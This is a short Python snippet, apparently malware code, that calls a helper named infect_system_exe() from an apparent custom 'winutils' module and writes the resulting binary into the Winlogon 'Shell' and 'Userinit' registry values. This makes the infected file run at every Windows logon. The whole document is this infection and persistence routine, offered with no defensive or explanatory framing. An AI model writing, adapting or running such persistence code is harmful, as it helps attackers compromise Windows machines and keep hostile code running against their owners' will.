import winutils

binary = winutils.infect_system_exe()

winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'Shell', 'explorer.exe,{0}'.format(binary))
winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'Userinit', 'C:\\Windows\\System32\\userinit.exe,{0}'.format(binary))
